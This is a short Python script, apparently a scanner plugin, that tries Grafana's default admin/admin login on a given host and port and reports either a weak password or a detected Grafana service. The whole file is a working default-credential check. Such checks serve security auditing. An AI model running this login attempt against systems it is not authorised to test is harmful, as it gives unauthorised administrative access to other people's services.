import requests
import json

# grafana弱口令
def poc(host, port, timeout):
    try:
        headers = {
        "Content-Type": "application/json;charset=UTF-8"
        }
        data = {"user": "admin", "email": "", "password": "admin"}
        res = requests.post(f"http://{host}:{port}/login", headers=headers, data=json.dumps(data), timeout=timeout, verify=False)
        if "Logged in" in res.text:
            return "grafana weakpass admin/admin"
        else:
            res = requests.get(f"http://{host}:{port}")
            if "grafana.com" in res.text:
                return "grafana service detected"
    except Exception as e:
        pass
    return None